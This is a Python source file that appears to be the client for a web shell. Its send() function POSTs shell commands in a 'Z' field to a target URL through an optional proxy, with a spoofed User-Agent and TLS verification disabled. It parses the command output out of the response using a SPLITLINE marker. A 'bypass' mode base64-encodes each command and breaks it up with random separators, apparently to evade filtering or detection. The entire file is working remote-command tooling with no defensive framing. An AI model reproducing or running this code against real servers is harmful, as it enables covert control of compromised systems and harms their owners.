import requests
import base64
import urllib3
urllib3.disable_warnings()
from os import urandom
import configparser

def send(url, data, uagent):

    config = configparser.ConfigParser()
    config.read('settings.ini')
    ts = config['SETTINGS']['send']
    proxy = config['SETTINGS']['proxy']
    if proxy != "":
        proxiy = []
        proxiy = proxy.split(":")
        proxies = {
        "http": f"http://{proxiy[0]}:{proxiy[1]}/",
        "https": f"http://{proxiy[0]}:{proxiy[1]}/"
        }
    else:
        proxies = {}

    if ts == "bypass":
        data = "echo \"aaa SPLITLINE_SPLITLINE_SPLITLINE\";"+ data
        text = str(base64.b64encode(bytes(data, encoding='utf8')).decode('utf-8'))
        chars = "_+=/"
        keksik = "".join(chars[c % len(chars)] for c in urandom(4))
        listOne = keksik.join([text[i:i+4] for i in range(0, len(text), 4)])
        r = requests.post(url, data={'Z': listOne, 'V': keksik},headers={"User-Agent" : uagent}, proxies=proxies, verify=False, timeout=20)
        a = r.text
        a = a[a.find('SPLITLINE_SPLITLINE_SPLITLINE'):].replace('SPLITLINE_SPLITLINE_SPLITLINE','')
        return(a)

    if ts == "classic":
        r = requests.post(url, data={'Z': "echo \"aaa SPLITLINE_SPLITLINE_SPLITLINE\";"+ data},headers={"User-Agent" : uagent}, proxies=proxies)
        a = r.text
        a = a[a.find('SPLITLINE_SPLITLINE_SPLITLINE'):].replace('SPLITLINE_SPLITLINE_SPLITLINE','')
        return(a)

    if ts == "simple":
        r = requests.post(url, data={'Z': data},headers={"User-Agent" : uagent}, proxies=proxies)
        return(r.text)